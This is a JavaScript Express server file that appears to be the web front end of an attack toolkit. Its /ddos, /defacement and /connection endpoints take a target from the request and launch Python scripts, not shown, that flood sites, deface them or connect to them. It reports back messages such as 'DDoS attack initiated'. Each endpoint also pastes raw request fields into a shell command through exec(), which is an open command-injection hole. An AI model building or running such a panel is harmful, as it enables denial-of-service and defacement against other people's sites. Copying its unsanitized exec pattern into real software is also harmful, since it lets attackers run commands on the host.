const express = require('express');
const { exec } = require('child_process');
const app = express();
const port = 3000;
const path = require('path');

app.use(express.static(path.join(__dirname, '../')));
app.use(express.json());

app.post('/ddos', (req, res) => {
    const target = req.body.target;
    const time = req.body.time;
    const method = req.body.method;

    if (!target || !time || !method) {
        return res.status(400).send('Target, time, and method are required');
    }

    const command = `python3 ${path.join(__dirname, 'ddos/ddos.py')} --target ${target} --time ${time} --method ${method}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return res.status(500).send(`Error executing attack: ${stderr}`);
        }
        console.log(`stdout: ${stdout}`);
        res.send('DDoS attack initiated');
    });
});

app.post('/defacement', (req, res) => {
    const target = req.body.target;
    const imageUrl = req.body.imageUrl;

    if (!target || !imageUrl) {
        return res.status(400).send('Target and image URL are required');
    }

    const command = `python3 ${path.join(__dirname, 'defacement/defacement.py')} --target ${target} --image_url ${imageUrl}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return res.status(500).send(`Error executing defacement: ${stderr}`);
        }
        console.log(`stdout: ${stdout}`);
        res.send('Defacement initiated');
    });
});

app.post('/connection', (req, res) => {
    const target = req.body.target;
    const port = req.body.port;

    if (!target || !port) {
        return res.status(400).send('Target and port are required');
    }

    const command = `python3 ${path.join(__dirname, 'connection/connection.py')} --target ${target} --port ${port}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return res.status(500).send(`Error establishing connection: ${stderr}`);
        }
        console.log(`stdout: ${stdout}`);
        res.send('Connection initiated');
    });
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});